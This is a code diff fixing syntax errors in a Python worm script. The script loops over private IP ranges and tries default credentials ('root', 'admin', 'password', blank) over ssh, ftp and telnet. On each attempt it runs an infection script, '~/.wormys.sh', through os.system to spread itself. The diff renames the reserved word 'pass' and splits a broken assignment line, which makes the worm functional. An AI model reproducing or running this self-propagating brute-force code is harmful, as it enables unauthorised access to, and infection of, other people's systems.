@@ -45,9 +45,13 @@ def main(args):
   userlist = ["root","admin","administrater"]
   passlist = ["root", "password", "", "admin"]
   user = ""
-  pass = ""
+  passw = ""
   infectionCode = ["~/.wormys.sh"]
-  i = 0, j = 0, p = 0, k = 0, h = 0
+  i = 0
+  j = 0
+  p = 0
+  k = 0
+  h = 0
   for h in range(0, 2):
     for i in range(0, 254):
       for j in range(0, 254):
@@ -59,9 +63,9 @@ def main(args):
           if server_Outgoing(argumentsOutgoing) is 1:
             for k in range(0, maxTryPerSequence):
               user = ""
-              pass = ""
+              passw = ""
               user = userlist[randint(0, len(userlist))]
-              pass = passlist[randint(0, len(passlist))]
+              passw = passlist[randint(0, len(passlist))]
               command = ""
               if pa[p] is 22:
                 command = "{} ssh".format(infectionCode[0])
@@ -69,7 +73,7 @@ def main(args):
                 command = "{} ftp".format(infectionCode[0])
               elif pa[p] is 23:
                 command = "{} telnet".format(infectionCode[0])
-              command = "{} {} {} {}.{}.{}.{}".format(command, user, pass, ij[0], ij[1], i, j)
+              command = "{} {} {} {}.{}.{}.{}".format(command, user, passw, ij[0], ij[1], i, j)
               
               os.system(command)
               time.sleep(randint(0, maxWait/2))
@@ -79,7 +83,7 @@ def main(args):
       c = 1
       ij = [10, 0]
   user = ""
-  pass = ""
+  passw = ""
   command = ""
   return 0
 	
